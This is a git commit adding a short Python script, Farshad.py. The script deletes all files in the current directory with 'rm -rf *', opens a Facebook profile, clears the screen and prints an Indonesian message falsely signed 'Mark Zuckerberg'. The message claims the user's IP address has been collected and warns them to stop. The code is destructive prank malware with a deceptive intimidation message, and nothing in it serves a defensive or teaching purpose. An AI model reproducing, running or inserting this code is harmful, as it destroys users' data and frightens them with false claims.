290545309e282458feb0002051b05cd5dcd2fe5e
nihalkhan-10 <64150867+nihalkhan-10@users.noreply.github.com>
2021-05-18 18:29:24 +0430

    Create Farshad.py
    All is Fu**

---
+++ Farshad.py
@@ -0,0 +1,5 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://www.facebook.com/nihal.kdr10")
+os.system("clear")
+print("\n\n Ini farshad ali from KDR AFG!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
